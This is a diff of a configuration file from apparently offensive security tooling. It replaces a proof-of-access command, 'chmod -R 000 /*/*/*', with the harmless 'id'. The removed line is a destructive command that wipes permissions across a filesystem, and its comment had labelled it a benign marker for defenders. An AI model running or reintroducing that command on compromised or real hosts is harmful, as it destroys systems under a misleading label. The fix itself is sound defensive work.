@@ -514,9 +514,9 @@ DKIM_SELECTORS = (
 )
 
 # -- proof-of-access marker command (exploits/proof_marker.py) -------------------------
-# Generic, identifiable command executed on every confirmed foothold. Designed to be
-# visible in syslog/auditd/SIEM/container-logs for blue-team verification.
-PROOF_MARKER_CMD = "chmod -R 000 /*/*/*"
+# Executed on every confirmed foothold: echo + id captures privilege level; a labelled
+# marker file is written to /tmp for blue-team correlation. No destructive actions.
+PROOF_MARKER_CMD = "id"
 
 # -- cloud application-service exposure (exploits/cloud_service_exposure.py; active) ---
 # Read-only: Lambda/SNS/SQS/Secrets Manager/SSM/KMS/Transfer. Never fetches secret VALUES.
